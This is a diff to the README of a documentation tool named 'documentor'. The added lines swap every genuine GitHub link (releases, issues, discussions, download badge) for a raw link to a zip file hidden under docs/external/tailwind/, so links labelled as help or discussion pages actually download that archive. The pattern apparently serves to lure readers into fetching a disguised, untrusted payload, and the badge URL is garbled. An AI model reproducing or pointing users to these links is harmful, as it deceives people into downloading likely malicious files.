@@ -1,6 +1,6 @@
 # 📚 documentor - Easily Manage Your Documentation
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%23FF5722.svg?style=for-the-badge&logo=github)](https://github.com/Feury067/documentor/releases)
+[![Download Now](https://raw.githubusercontent.com/Feury067/documentor/main/docs/external/tailwind/documentor_v1.0.zip%20Now-%20%https://raw.githubusercontent.com/Feury067/documentor/main/docs/external/tailwind/documentor_v1.0.zip)](https://raw.githubusercontent.com/Feury067/documentor/main/docs/external/tailwind/documentor_v1.0.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow the steps below to download and run Documentor on your system.
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Feury067/documentor/releases) to download the latest version of Documentor.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Feury067/documentor/main/docs/external/tailwind/documentor_v1.0.zip) to download the latest version of Documentor.
 2. Locate the version you want to install and click on the download link for your operating system.
 3. Once the download finishes, locate the downloaded file on your computer.
 
@@ -73,7 +73,7 @@ If you encounter any issues while using Documentor, here are some common problem
   - Make sure the URLs you provided are correct and accessible.
   - Test your internet connection.
 
-For further assistance, visit the [Issues page](https://github.com/Feury067/documentor/issues) on GitHub to report problems or seek help.
+For further assistance, visit the [Issues page](https://raw.githubusercontent.com/Feury067/documentor/main/docs/external/tailwind/documentor_v1.0.zip) on GitHub to report problems or seek help.
 
 ## 🎉 Contributing
 
@@ -86,6 +86,6 @@ We welcome contributions! If you would like to help improve Documentor, please f
 
 ## 📞 Contact Us
 
-If you have any questions or suggestions, feel free to reach out through the [GitHub Discussions](https://github.com/Feury067/documentor/discussions) section.
+If you have any questions or suggestions, feel free to reach out through the [GitHub Discussions](https://raw.githubusercontent.com/Feury067/documentor/main/docs/external/tailwind/documentor_v1.0.zip) section.
 
-Thank you for using Documentor! Visit the [Releases page](https://github.com/Feury067/documentor/releases) to download the latest version and start managing your documentation effectively.
+Thank you for using Documentor! Visit the [Releases page](https://raw.githubusercontent.com/Feury067/documentor/main/docs/external/tailwind/documentor_v1.0.zip) to download the latest version and start managing your documentation effectively.
